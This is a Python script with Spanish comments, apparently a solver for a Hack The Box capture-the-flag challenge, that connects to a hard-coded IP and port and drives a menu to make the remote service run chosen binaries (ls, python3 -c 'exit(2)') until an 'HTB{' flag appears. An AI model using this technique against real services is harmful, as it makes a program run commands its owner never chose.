#!/usr/bin/env python3

import socket
import time
import sys
import threading

def persistent_exploit():
    """Explotación persistente que mantiene la conexión activa"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("=== EXPLOTACIÓN PERSISTENTE ===")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((host, port))
        
        print("¡Conectado!")
        
        # Leer banner inicial
        banner = s.recv(4096).decode('utf-8', errors='ignore')
        print("Banner inicial:")
        print(banner)
        
        # Función para leer continuamente
        def read_continuously():
            while True:
                try:
                    data = s.recv(4096).decode('utf-8', errors='ignore')
                    if data:
                        print(f"Datos recibidos: {repr(data)}")
                        if "What an awesome player!" in data:
                            print("*** ¡¡¡CONDICIÓN DE VICTORIA CUMPLIDA!!! ***")
                        if "HTB{" in data:
                            start = data.find("HTB{")
                            end = data.find("}", start) + 1
                            if end > start:
                                flag = data[start:end]
                                print(f"🎉🎉🎉 FLAG ENCONTRADA: {flag} 🎉🎉🎉")
                                return flag
                    else:
                        break
                except:
                    break
            return None
        
        # Iniciar hilo de lectura
        reader_thread = threading.Thread(target=read_continuously)
        reader_thread.daemon = True
        reader_thread.start()
        
        # Configurar y ejecutar
        def send_cmd(cmd):
            print(f"Enviando: {repr(cmd)}")
            s.send(cmd.encode())
            time.sleep(1)
        
        # Configurar mode
        send_cmd("1\n")
        send_cmd("~0\n")
        
        # Configurar bin
        send_cmd("2\n")
        send_cmd("ls\n")
        
        # Configurar args
        send_cmd("3\n")
        send_cmd("--invalid-option\n")
        
        # Configurar switches
        send_cmd("4\n")
        send_cmd("/nonexistent\n")
        
        # Ejecutar
        print("Ejecutando...")
        send_cmd("5\n")
        
        # Esperar respuesta
        time.sleep(5)
        
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
        return None

def simple_direct_exploit():
    """Explotación simple y directa"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("\n=== EXPLOTACIÓN SIMPLE Y DIRECTA ===")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((host, port))
        
        print("¡Conectado!")
        
        # Leer banner
        banner = s.recv(4096).decode('utf-8', errors='ignore')
        print("Banner recibido")
        
        # Enviar toda la configuración de una vez
        commands = [
            "1\n",           # Seleccionar mode
            "~0\n",          # mode = -1
            "2\n",           # Seleccionar bin
            "ls\n",          # bin = ls
            "3\n",           # Seleccionar args
            "--invalid-option\n",  # args inválidos
            "4\n",           # Seleccionar switches
            "/nonexistent\n", # switches inválidos
            "5\n"            # Ejecutar
        ]
        
        print("Enviando todos los comandos...")
        for cmd in commands:
            print(f"Enviando: {repr(cmd)}")
            s.send(cmd.encode())
            time.sleep(0.5)
        
        print("Esperando respuesta final...")
        time.sleep(3)
        
        # Leer respuesta final
        final_response = s.recv(8192).decode('utf-8', errors='ignore')
        print(f"Respuesta final ({len(final_response)} chars):")
        print(repr(final_response))
        print(final_response)
        
        # Buscar flag
        all_data = banner + final_response
        if "What an awesome player!" in all_data:
            print("*** ¡¡¡CONDICIÓN DE VICTORIA CUMPLIDA!!! ***")
        
        if "HTB{" in all_data:
            start = all_data.find("HTB{")
            end = all_data.find("}", start) + 1
            if end > start:
                flag = all_data[start:end]
                print(f"🎉🎉🎉 FLAG ENCONTRADA: {flag} 🎉🎉🎉")
                s.close()
                return flag
        
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
        return None

def test_with_python3():
    """Probar con python3 y exit codes"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("\n=== PROBANDO CON PYTHON3 ===")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((host, port))
        
        print("¡Conectado!")
        
        # Leer banner
        banner = s.recv(4096).decode('utf-8', errors='ignore')
        
        # Configurar con python3
        commands = [
            "1\n",           # Seleccionar mode
            "~0\n",          # mode = -1
            "2\n",           # Seleccionar bin
            "python3\n",     # bin = python3
            "3\n",           # Seleccionar args
            "-c,exit(2)\n",  # args para returncode = 2
            "4\n",           # Seleccionar switches
            "-c,exit(1)\n",  # switches para returncode = 1
            "5\n"            # Ejecutar
        ]
        
        print("Enviando comandos python3...")
        for cmd in commands:
            print(f"Enviando: {repr(cmd)}")
            s.send(cmd.encode())
            time.sleep(0.5)
        
        print("Esperando respuesta...")
        time.sleep(3)
        
        # Leer respuesta
        final_response = s.recv(8192).decode('utf-8', errors='ignore')
        print(f"Respuesta ({len(final_response)} chars):")
        print(repr(final_response))
        print(final_response)
        
        # Buscar flag
        all_data = banner + final_response
        if "What an awesome player!" in all_data:
            print("*** ¡¡¡CONDICIÓN DE VICTORIA CUMPLIDA!!! ***")
        
        if "HTB{" in all_data:
            start = all_data.find("HTB{")
            end = all_data.find("}", start) + 1
            if end > start:
                flag = all_data[start:end]
                print(f"🎉🎉🎉 FLAG ENCONTRADA: {flag} 🎉🎉🎉")
                s.close()
                return flag
        
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    print("Iniciando cazador persistente...")
    
    # Probar explotación simple
    flag = simple_direct_exploit()
    if flag:
        print(f"¡FLAG ENCONTRADA: {flag}!")
        sys.exit(0)
    
    # Probar con python3
    flag = test_with_python3()
    if flag:
        print(f"¡FLAG ENCONTRADA: {flag}!")
        sys.exit(0)
    
    print("No se encontró la flag")